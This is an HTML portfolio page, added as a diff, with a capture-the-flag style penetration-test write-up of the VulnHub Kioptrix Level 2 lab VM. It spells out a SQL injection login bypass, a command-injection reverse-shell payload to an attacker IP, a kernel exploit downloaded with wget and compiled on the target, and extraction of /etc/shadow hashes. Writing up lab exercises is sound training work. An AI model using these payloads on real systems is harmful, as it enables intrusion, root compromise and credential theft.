@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kioptrix Level 2 — VulnHub — Waseef's Portfolio</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
+      --border: #30363d; --text: #e6edf3; --muted: #8b949e;
+      --accent: #58a6ff; --accent2: #3fb950; --red: #f85149;
+      --orange: #d29922; --radius: 8px;
+      --c-red: #f85149; --c-blue: #58a6ff; --c-green: #3fb950;
+      --c-yellow: #d29922; --c-purple: #bc8cff; --c-pink: #ff7b72;
+      --c-gray: #8b949e;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; font-size: 15px; line-height: 1.7; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    nav { position: sticky; top: 0; z-index: 100; background: rgba(13,17,23,.9); backdrop-filter: blur(12px);
+          border-bottom: 1px solid var(--border); padding: .75rem 2rem; display: flex; align-items: center; justify-content: space-between; }
+    .nav-logo { font-weight: 600; font-size: 1rem; color: var(--text); }
+    .nav-back { font-size: .85rem; color: var(--muted); display: flex; align-items: center; gap: .4rem; }
+    .nav-back:hover { color: var(--accent); text-decoration: none; }
+    .hero { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 3rem 2rem 2.5rem; }
+    .hero-inner { max-width: 860px; margin: 0 auto; }
+    .breadcrumb { font-size: .8rem; color: var(--muted); margin-bottom: 1rem; }
+    .breadcrumb a { color: var(--muted); }
+    .breadcrumb a:hover { color: var(--accent); }
+    .hero h1 { font-size: 2rem; font-weight: 700; margin-bottom: 1rem; }
+    .hero p.desc { color: var(--muted); max-width: 640px; margin-top: .5rem; }
+    .meta-row { display: flex; flex-wrap: wrap; gap: .6rem; align-items: center; }
+    .badge { display: inline-flex; align-items: center; gap: .3rem; padding: .25rem .7rem;
+             border-radius: 20px; font-size: .75rem; font-weight: 500; }
+    .badge-platform { background: #1f3a5f; color: #58a6ff; border: 1px solid #1f4080; }
+    .badge-easy { background: #1a3a2a; color: #3fb950; border: 1px solid #2ea043; }
+    .badge-medium { background: #3a2a1a; color: #d29922; border: 1px solid #9e6a03; }
+    .badge-hard { background: #3a1a1a; color: #f85149; border: 1px solid #da3633; }
+    .badge-beginner { background: #1a3a2a; color: #56d364; border: 1px solid #2ea043; }
+    .badge-os { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .badge-date { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .content { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    h1, h2, h3 { color: var(--text); font-weight: 600; margin: 2rem 0 .75rem; }
+    h2 { font-size: 1.35rem; padding-bottom: .5rem; border-bottom: 1px solid var(--border); }
+    h3 { font-size: 1.1rem; color: var(--accent); }
+    p { margin: .6rem 0; color: #c9d1d9; }
+    ul, ol { margin: .5rem 0 .5rem 1.5rem; }
+    li { margin: .3rem 0; color: #c9d1d9; }
+    hr { border: none; border-top: 1px solid var(--border); margin: 1.5rem 0; }
+    blockquote { border-left: 3px solid var(--accent); padding: .5rem 1rem; margin: .75rem 0;
+                 background: var(--bg2); border-radius: 0 var(--radius) var(--radius) 0; color: var(--muted); }
+    pre { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius);
+          padding: 1rem 1.25rem; overflow-x: auto; margin: .75rem 0; }
+    code { font-family: 'Fira Code', monospace; font-size: .85rem; color: #e6edf3; }
+    p code { background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; color: var(--accent); font-size: .82rem; }
+    strong code { background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; }
+    figure { margin: 1.25rem 0; }
+    img { max-width: 100%; border-radius: var(--radius); border: 1px solid var(--border);
+          display: block; margin: 0 auto; }
+    figcaption { text-align: center; font-size: .8rem; color: var(--muted); margin-top: .4rem; }
+    .callout { display: flex; gap: .75rem; align-items: flex-start; background: var(--bg2);
+               border: 1px solid var(--border); border-radius: var(--radius); padding: .9rem 1rem; margin: .75rem 0; }
+    .callout-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: .1rem; }
+    details { border: 1px solid var(--border); border-radius: var(--radius); margin: .5rem 0; }
+    summary { padding: .6rem 1rem; cursor: pointer; font-weight: 500; background: var(--bg2); border-radius: var(--radius); }
+    details[open] summary { border-radius: var(--radius) var(--radius) 0 0; border-bottom: 1px solid var(--border); }
+    details > *:not(summary) { padding: .75rem 1rem; }
+    .table-wrap { overflow-x: auto; margin: .75rem 0; }
+    table { border-collapse: collapse; width: 100%; font-size: .9rem; }
+    th, td { padding: .6rem .9rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg3); font-weight: 600; }
+    tr:nth-child(even) { background: rgba(33,38,45,.5); }
+    .columns { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1rem; margin: .75rem 0; }
+    .cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
+    .card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.25rem;
+            transition: border-color .15s, transform .15s; display: block; }
+    .card:hover { border-color: var(--accent); transform: translateY(-2px); text-decoration: none; }
+    .card-header { display: flex; align-items: flex-start; justify-content: space-between; margin-bottom: .6rem; gap: .5rem; }
+    .card-title { font-size: 14px; font-weight: 600; color: var(--text); }
+    .card-meta { font-size: 12px; color: var(--muted); margin-bottom: .4rem; }
+    .card-desc { font-size: 13px; color: var(--muted); }
+    footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; color: var(--muted); font-size: .85rem; }
+</style>
+</head>
+<body>
+<nav>
+  <span class="nav-logo">Waseef</span>
+  <a href="../../index.html" class="nav-back">← Back to Portfolio</a>
+</nav>
+
+<div class="hero">
+  <div class="hero-inner">
+    <div class="breadcrumb"><a href="../../index.html">Portfolio</a> / <a href="../../index.html#machines">Machines</a> / Kioptrix Level 2 — VulnHub</div>
+    <h1>Kioptrix Level 2 — VulnHub</h1>
+    <div class="meta-row">
+      <span class="badge badge-platform">🖥 VulnHub</span>
+      <span class="badge badge-easy">🟢 Easy</span>
+      <span class="badge badge-os">🐧 Linux (CentOS, Kernel 2.6.9-55.EL)</span>
+      <span class="badge badge-date">📅 2026-07-07</span>
+    </div>
+  </div>
+</div>
+
+<div class="content">
+<h1 id="kioptrix-level-2-penetration-test-report">Kioptrix Level 2 — Penetration Test Report</h1>
+<h2 id="machine-info">Machine Info</h2>
+<div class='table-wrap'><table>
+  <tr><th>Field</th><th>Value</th></tr>
+  <tr><td><strong>Machine</strong></td><td>Kioptrix Level 2</td></tr>
+  <tr><td><strong>Platform</strong></td><td>VulnHub</td></tr>
+  <tr><td><strong>IP Address</strong></td><td><code>172.20.10.4</code></td></tr>
+  <tr><td><strong>OS</strong></td><td>Linux (CentOS, Kernel 2.6.9-55.EL)</td></tr>
+  <tr><td><strong>Difficulty</strong></td><td>Easy</td></tr>
+  <tr><td><strong>Date</strong></td><td>2026-07-07</td></tr>
+</table></div>
+<hr>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>Kioptrix Level 2 was compromised through a two-stage web attack chain. A SQL injection vulnerability on the login page provided unauthenticated access to an administrative console, which contained a command injection vulnerability in a ping utility that yielded a reverse shell as the <code>apache</code> user. Privilege escalation to root was achieved by exploiting a local kernel vulnerability (CVE-2009-2698) targeting the <code>ip_append_data()</code> function in Linux kernel 2.6.9. Post-exploitation included extraction of password hashes from <code>/etc/shadow</code>.</p>
+<hr>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="objective">Objective</h3>
+<p>Identify the live host on the network, discover open ports, identify running services and their versions, and fingerprint the operating system.</p>
+<h3 id="findings">Findings</h3>
+<p>Host discovery was performed using <code>arp-scan</code> on the local network, which identified the target at <code>172.20.10.4</code>. A subsequent Nmap scan with service version detection and OS fingerprinting revealed six open ports: SSH (22), HTTP (80), HTTPS (443), rpcbind (111), CUPS (631), and MySQL (3306). The web server was identified as Apache 2.0.52 running on CentOS. OS detection placed the kernel in the Linux 2.6.9–2.6.30 range. MySQL returned an “unauthorized” banner, indicating no anonymous access.</p>
+<p><strong>PoC:</strong>
+- <strong>Tools used</strong>: arp-scan, Nmap
+- <strong>Commands</strong>:
+- <code>arp-scan -l</code>
+- <code>nmap -sV -O 172.20.10.4</code>
+- <strong>Result</strong>: Target identified. Open ports: 22 (SSH 3.9p1), 80 (Apache 2.0.52), 111 (rpcbind), 443 (Apache 2.0.52), 631 (CUPS 1.1), 3306 (MySQL — unauthorized). OS: Linux 2.6.9–2.6.30.</p>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="objective">Objective</h3>
+<p>Enumerate web content, SMB shares, and investigate each discovered service for exploitable vulnerabilities.</p>
+<h3 id="findings">Findings</h3>
+<p><strong>Web enumeration</strong> revealed that the HTTPS service on port 443 was inaccessible due to an unsupported SSL version. Port 80 returned the default Apache test page at the root. Directory brute-forcing with Gobuster uncovered <code>index.php</code>, which presented a web login form — a significant finding missed by simply browsing to <code>/</code>.</p>
+<p><strong>SMB enumeration</strong> using enum4linux identified several usernames (<code>administrator</code>, <code>root</code>, <code>bin</code>, <code>guest</code>, <code>none</code>) but failed to establish a session, making SMB a dead end.</p>
+<p><strong>Service exploit research</strong> was conducted for each enumerated service. Searchsploit and Metasploit were used to query exploits for Apache 2.0.52, rpcbind, and CUPS 1.1. Apache results returned no reliable remote code execution modules. rpcbind results were limited to denial-of-service. CUPS 1.1 had searchsploit entries but no matching Metasploit modules and no exploitable remote vector. All three services were ruled out as initial access vectors.</p>
+<p><strong>PoC:</strong>
+- <strong>Tools used</strong>: Gobuster, enum4linux, searchsploit, Metasploit
+- <strong>Commands</strong>:
+- <code>gobuster dir -u http://172.20.10.4 -w &lt;wordlist&gt;</code>
+- <code>enum4linux 172.20.10.4</code>
+- <code>searchsploit apache 2.0.52</code>
+- <code>searchsploit rpcbind</code>
+- <code>searchsploit cups 1.1</code>
+- <code>msfconsole</code> → <code>search apache 2.0</code> / <code>search rpcbind</code> / <code>search cups 1.1</code>
+- <strong>Result</strong>: <code>index.php</code> discovered (HTTP 200). Usernames enumerated via SMB. No exploitable remote vulnerabilities found for Apache, rpcbind, or CUPS via searchsploit or Metasploit.</p>
+<hr>
+<h2 id="exploitation-initial-foothold">Exploitation — Initial Foothold</h2>
+<h3 id="description">Description</h3>
+<p>The login form at <code>index.php</code> was vulnerable to SQL injection, allowing authentication bypass with a crafted payload. Once authenticated, the administrative console exposed a network ping utility at <code>pingit.php</code> that passed user input directly to a shell command without sanitization, enabling OS command injection and resulting in a reverse shell as the <code>apache</code> user.</p>
+<h3 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h3>
+<p><strong>Phase 1 — SQL Injection Login Bypass</strong></p>
+<ol>
+  <li>Navigate to <code>http://172.20.10.4/index.php</code>.</li>
+  <li>In the username field, enter the payload <code>' OR 1=1 -- -</code> and submit with any password.</li>
+  <li>The application authenticates and redirects to the administrative console.  <figure><img src="images/kioptrix-level-2/396b7523717280969d98d3890ecdf0ef.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/kioptrix-level-2/396b75237172802da8ece448100eb947.png" alt="screenshot" loading="lazy"></figure>
+</li>
+</ol>
+<p><strong>Phase 2 — Command Injection → Reverse Shell</strong></p>
+<ol>
+  <li>On the attacker machine, start a Netcat listener: <code>nc -lvnp 4444</code>.</li>
+  <li>In the ping utility field on <code>pingit.php</code>, submit the following payload:
+<code>172.20.10.4 &amp; sh -i &gt;&amp; /dev/tcp/172.20.10.5/4444 0&gt;&amp;1</code></li>
+  <li>The application executes the injected command. A reverse shell connects back to the listener.</li>
+  <li>Confirm access: <code>whoami</code> returns <code>apache</code>; <code>id</code> returns <code>uid=48(apache) gid=48(apache)</code>.</li>
+  <li>Confirm kernel version: <code>uname -a</code> returns <code>Linux kioptrix.level2 2.6.9-55.EL</code>.  <figure><img src="images/kioptrix-level-2/396b7523717280509f75ea1543e4e07b.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/kioptrix-level-2/396b7523717280e28a1cd83fb1b95ab0.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/kioptrix-level-2/396b7523717280509bffec7469a0f376.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/kioptrix-level-2/396b7523717280e8af33d975fe167770.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/kioptrix-level-2/396b75237172802fbd29f5ed6948dfb6.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/kioptrix-level-2/396b75237172801995d7eeea432a5e27.png" alt="screenshot" loading="lazy"></figure>
+</li>
+</ol>
+<hr>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="description">Description</h3>
+<p>The target kernel version (2.6.9-55.EL) is affected by CVE-2009-2698, a local privilege escalation vulnerability in the <code>ip_append_data()</code> function within the Linux kernel’s UDP socket handling. Exploitation causes a Ring 0 privilege escalation, granting full root access. The exploit (EDB-9542) was identified via searchsploit, transferred to the target, compiled in place, and executed.</p>
+<h3 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h3>
+<ol>
+  <li>On the attacker machine, search for a suitable kernel exploit:
+<code>searchsploit linux kernel 2.6.9 local privilege</code></li>
+  <li>Identify exploit <code>linux_x86/local/9542.c</code> (CVE-2009-2698).</li>
+  <li>Copy the exploit to the working directory: <code>searchsploit -m linux_x86/local/9542.c</code>.</li>
+  <li>Serve the exploit over HTTP from the attacker machine:
+<code>python3 -m http.server 8080</code></li>
+  <li>On the reverse shell (as <code>apache</code>), navigate to a writable directory and download the exploit:
+<code>cd /tmpwget http://172.20.10.5:8080/9542.c</code></li>
+  <li>Compile the exploit on the target: <code>gcc 9542.c -o exploit</code></li>
+  <li>Execute the exploit: <code>./exploit</code></li>
+  <li>Confirm root: <code>whoami</code> returns <code>root</code>; <code>id</code> returns <code>uid=0(root) gid=0(root) groups=48(apache)</code>.  <figure><img src="images/kioptrix-level-2/396b7523717280bd96fec73d444fcff2.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/kioptrix-level-2/396b7523717280ce9ac1ca93d0fb1f2b.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/kioptrix-level-2/396b7523717280ad8e74d1027946210c.png" alt="screenshot" loading="lazy"></figure>
+</li>
+</ol>
+<h3 id="post-exploitation">Post-Exploitation</h3>
+<p>With root access, <code>/etc/passwd</code> and <code>/etc/shadow</code> were read to extract system user accounts and password hashes. The <code>unshadow</code> utility was used on the attacker machine to combine the files into a format suitable for offline cracking. The root account password was also reset via <code>passwd</code> to confirm persistent access. Root login was verified directly on the VMware console.</p>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<p><strong>SQL injection remains a critical first target on web login forms.</strong> Even with SMB usernames available, credential attacks against the login form were unnecessary — the form itself was bypassed entirely with a classic <code>OR 1=1</code> payload. Checking for SQLi before attempting brute force saves significant time.</p>
+<p><strong>Service enumeration should not stop at “no Metasploit module.”</strong> Apache, rpcbind, and CUPS all had searchsploit entries, but none provided a viable remote exploit. The real attack surface was the web application layer — not the underlying services. Enumerate web content thoroughly before concluding there is no path in.</p>
+<p><strong>Kernel version is a critical post-shell data point.</strong> <code>uname -a</code> immediately after landing a shell is essential. The kernel version (2.6.9-55.EL) narrowed the privilege escalation search significantly and led directly to a working exploit.</p>
+<p><strong>Initial access does not require a writable web root.</strong> The <code>wget</code> to <code>/var/www/html</code> failed due to permissions, but <code>/tmp</code> was writable and gcc was available on the target. Old Linux systems often have compilers installed — exploits can be compiled in place rather than transferred as binaries.</p>
+
+</div>
+
+<footer>Built by Waseef · <a href="../../index.html">Back to Portfolio</a></footer>
+</body>
+</html>
